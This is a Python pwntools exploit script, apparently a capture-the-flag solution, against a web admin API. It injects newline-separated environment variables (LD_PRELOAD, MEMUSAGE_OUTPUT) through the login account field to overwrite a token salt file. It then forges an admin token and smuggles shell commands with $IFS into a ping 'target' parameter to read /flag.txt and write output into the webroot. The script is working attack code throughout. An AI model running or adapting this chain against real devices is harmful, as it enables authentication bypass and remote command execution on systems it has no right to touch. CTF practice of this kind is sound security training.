#!/usr/bin/env python3
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

json = __import__('json')
time = __import__('time')
re = __import__('re')
crypt = __import__('crypt')
quote_plus = __import__('urllib.parse', fromlist=['quote_plus']).quote_plus

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 80)


def ub64(x):
    if isinstance(x, str):
        x = x.encode()
    return b64e(x).replace('+', '-').replace('/', '_').replace('=', '')


def qs(d):
    return '&'.join(f'{quote_plus(str(k))}={quote_plus(str(v))}' for k, v in d.items())


def http(path, params=None):
    if params:
        path = f'{path}?{qs(params)}'

    io = remote(host, port)
    req = (
        f'GET {path} HTTP/1.1\r\n'
        f'Host: {host}\r\n'
        'Connection: close\r\n'
        '\r\n'
    ).encode()

    # gdb.attach(io, 'b *main\nc')

    io.send(req)
    head = io.recvuntil(b'\r\n\r\n')
    code = int(head.split(b' ', 2)[1])
    body = io.recvall(timeout=2)
    io.close()
    return code, head, body


def api(api_name, method, version, **kw):
    params = {
        'api': api_name,
        'method': method,
        'version': str(version),
    }
    params.update(kw)
    return http('/webapi/entry.cgi', params)


def j(body):
    return json.loads(body.decode(errors='ignore'))


def forge(user='admin'):
    exp = str(int(time.time()) + 86400 * 7)
    sig = crypt.crypt(f'{user}|{exp}', '$6$$')
    return '.'.join([ub64(user), exp, ub64(sig)])


def clobber_salt():
    account = (
        'seed\n'
        'PLUGIN_VALUE_END\n'
        'LD_PRELOAD:/usr/lib/x86_64-linux-gnu/libmemusage.so\n'
        'MEMUSAGE_OUTPUT:/usr/mw/etc/mw_token_salt'
    )
    code, _, body = api(
        'MW.API.Auth',
        'login',
        7,
        account=account,
        passwd='x',
    )
    log.info(f'login http = {code}')
    log.info(f'login body = {body.decode(errors="ignore")}')
    return j(body)


def check_token(tok):
    code, _, body = api(
        'MW.API.Auth.Key',
        'get',
        1,
        mw_token=tok,
    )
    log.info(f'auth.key http = {code}')
    log.info(f'auth.key body = {body.decode(errors="ignore")}')
    return j(body)


def ping(tok, target):
    code, _, body = api(
        'MW.API.Network.Ping',
        'run',
        1,
        mw_token=tok,
        target=target,
    )
    log.info(f'ping http = {code}')
    log.info(f'ping body = {body.decode(errors="ignore")}')
    return body


def get_flag(tok):
    tag = hex(int(time.time()))[2:]
    mark = f'FLAGMARK{tag}_'
    out = f'lsroot_{tag}'

    ping(tok, f'127.0.0.1$(touch$IFS/{mark}$(cat$IFS/flag.txt))')
    time.sleep(1)
    ping(tok, f'127.0.0.1$(/usr/bin/script$IFS-q$IFS-c$IFS/bin/ls$IFS/usr/mw/webman/{out})')
    time.sleep(1)

    code, _, body = http(f'/{out}')
    if code != 200:
        log.failure(f'get /{out} -> {code}')
        raise SystemExit(1)

    text = body.decode(errors='ignore')
    log.info(text)
    m = re.search(r'polarisctf\{[^}\n]+\}', text)
    if not m:
        log.failure('flag not found')
        raise SystemExit(1)
    return m.group(0)


if __name__ == '__main__':
    code, _, _ = http('/')
    log.info(f'root http = {code}')

    resp = clobber_salt()
    log.success(f'login_response = {json.dumps(resp, ensure_ascii=False)}')
    time.sleep(1)

    tok = forge('admin')
    log.success(f'mw_token = {tok}')

    info = check_token(tok)
    log.success(f'token_check = {json.dumps(info, ensure_ascii=False)}')

    flag = get_flag(tok)
    log.success(f'flag = {flag}')
